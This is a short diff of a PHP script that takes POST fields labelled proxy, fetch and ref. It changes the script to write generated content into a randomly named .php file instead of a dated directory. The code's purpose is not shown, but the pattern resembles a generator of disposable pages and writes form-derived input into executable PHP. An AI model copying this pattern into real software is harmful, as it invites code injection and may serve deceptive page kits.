@@ -146,22 +146,14 @@ $proxy = htmlspecialchars($_POST["x12"]);
 $fetch = htmlspecialchars($_POST["x13"]);
 $ref = htmlspecialchars($_POST["x14"]);
 
-
-$dirr = date("l");
-$dit = strtolower($dirr);
-if (!file_exists($dit)) {
-    mkdir($dit);
+function getRandomWord($len = 10) {
+    $word = array_merge(range('a', 'z'), range('A', 'Z'));
+    shuffle($word);
+    return substr(implode($word), 0, $len);
 }
-$f_contents = file("random.txt"); 
-$line = $f_contents[rand(0, count($f_contents) - 1)];
-$line2 = $f_contents[rand(0, count($f_contents) - 1)];
-$dir = $dit ."/". trim($line) ."X" . trim($line2)  ;
-mkdir($dir);
 
 
-
-
-$file = $dir ."/index.php";
+$file = getRandomWord() .".php";
 
 $body = "
 
